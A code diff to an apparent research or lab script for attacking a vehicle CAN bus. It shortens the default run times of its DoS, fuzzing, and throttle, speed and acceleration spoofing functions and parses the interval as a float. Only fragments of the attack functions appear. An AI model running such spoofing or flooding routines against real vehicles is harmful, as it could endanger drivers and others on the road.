@@ -23,7 +23,7 @@ def generate_random_bytes():
         bytes.append(random.randrange(0, 255))
     return bytes
 
-def dos_attack(interval=0.0002, duration=30):
+def dos_attack(interval=0.0002, duration=5):
     """Sends a strem of high-priority message."""
     print("Starting DoS Attack")
     for i in range(int(duration / interval)):
@@ -34,7 +34,7 @@ def dos_attack(interval=0.0002, duration=30):
         task.stop()
     print("Stopped DoS cyclic send")
 
-def fuzzy_attack(interval=0.003, duration=30):
+def fuzzy_attack(interval=0.003, duration=5):
     """Sends stream of random id and payload messages."""
     print("Starting Fuzzy Attack")
     for i in range(int(duration / interval)):
@@ -45,7 +45,7 @@ def fuzzy_attack(interval=0.003, duration=30):
         task.stop()
     print("Stopped Fuzzy attack")
 
-def throt_spoofing(interval=0.01, duration=30):
+def throt_spoofing(interval=0.01, duration=5):
     """Sends falsified throttle message."""
     print("Starting Throttle Spoofing")
     for i in range(int(duration / interval)):
@@ -56,7 +56,7 @@ def throt_spoofing(interval=0.01, duration=30):
         task.stop()
     print("Stopped Throttle Spoofing")
 
-def speed_spoofing(interval=0.01, duration=30):
+def speed_spoofing(interval=0.01, duration=5):
     """Sends falsified throttle message."""
     print("Starting Vehicle Speed Spoofing")
     for i in range(int(duration / interval)):
@@ -67,7 +67,7 @@ def speed_spoofing(interval=0.01, duration=30):
         task.stop()
     print("Stopped Vehicle Speed Spoofing")
 
-def acelleration_spoofing(interval=0.01, duration=30):
+def acelleration_spoofing(interval=0.01, duration=5):
     """Sends falsified acelleration response message."""
     print("Starting Acceleration Spoofing")
     for i in range(int(duration / interval)):
@@ -90,7 +90,7 @@ if __name__ == "__main__":
 
     if len(sys.argv) > 3:
         duration = int(sys.argv[2])
-        interval = int(sys.argv[3])
+        interval = float(sys.argv[3])
         if (command == "dos"):
             dos_attack(duration=duration, interval=interval)
         elif (command == "fuzzy"):
